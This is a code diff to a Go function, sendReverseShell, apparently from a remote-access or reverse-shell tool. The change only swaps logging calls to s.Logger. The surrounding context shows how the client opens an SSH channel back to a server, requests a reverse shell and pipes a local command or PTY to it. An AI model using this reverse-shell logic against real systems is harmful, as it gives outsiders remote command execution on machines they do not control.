@@ -16,7 +16,7 @@ import (
 func (s *Session) sendReverseShell(request *ssh.Request) {
 	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
 	if openErr != nil {
-		s.Errorf("failed to open a \"session\" channel to server")
+		s.Logger.Errorf("failed to open a \"session\" channel to server")
 		return
 	}
 	defer func() { _ = channel.Close() }()
@@ -26,25 +26,25 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 	// Request Server Term Size
 	_, payload, reqErr := s.sendConnRequest("window-size", true, nil)
 	if reqErr != nil {
-		s.Errorf("%v", reqErr)
+		s.Logger.Errorf("%v", reqErr)
 	}
 	var termSize interpreter.TermSize
 	if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
 		// If error term initializes with size 0 0
-		s.Errorf("%v", unMarshalErr)
+		s.Logger.Errorf("%v", unMarshalErr)
 	}
 
 	if s.interpreter.PtyOn {
 		// Notify server we will be sending a PTY
 		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
 		if errSSHReq != nil {
-			s.Errorf("pty-req %v", errSSHReq)
+			s.Logger.Errorf("pty-req %v", errSSHReq)
 		}
 
 		// Notify server we will send a Reverse Shell
 		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			s.Errorf("pty-req %v", errSSHReq)
+			s.Logger.Errorf("pty-req %v", errSSHReq)
 		}
 
 		ptyF, _ := pty.StartWithSize(cmd, &pty.Winsize{
@@ -56,7 +56,7 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		// Copy all SSH session output to the term
 		go func() {
 			if _, outCopyErr := io.Copy(s.interpreter.Pty, channel); outCopyErr != nil {
-				s.Debugf("Copy stdout: %s", outCopyErr)
+				s.Logger.Debugf("Copy stdout: %s", outCopyErr)
 			}
 		}()
 
@@ -65,13 +65,13 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 
 		// Copy term output to SSH session stdin
 		if _, inCopyErr := io.Copy(channel, s.interpreter.Pty); inCopyErr != nil {
-			s.Debugf("Copy stdin: %s", inCopyErr)
+			s.Logger.Debugf("Copy stdin: %s", inCopyErr)
 		}
 	} else {
 		// Notify server we will send a Reverse Shell
 		_, errSSHReq := channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			s.Errorf("reverse-shell %v", errSSHReq)
+			s.Logger.Errorf("reverse-shell %v", errSSHReq)
 		}
 
 		pr, pw := io.Pipe()
@@ -93,7 +93,7 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		_ = s.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if runErr := cmd.Run(); runErr != nil {
-			s.Errorf("failed to execute command error - %v", runErr)
+			s.Logger.Errorf("failed to execute command error - %v", runErr)
 		}
 	}
 }
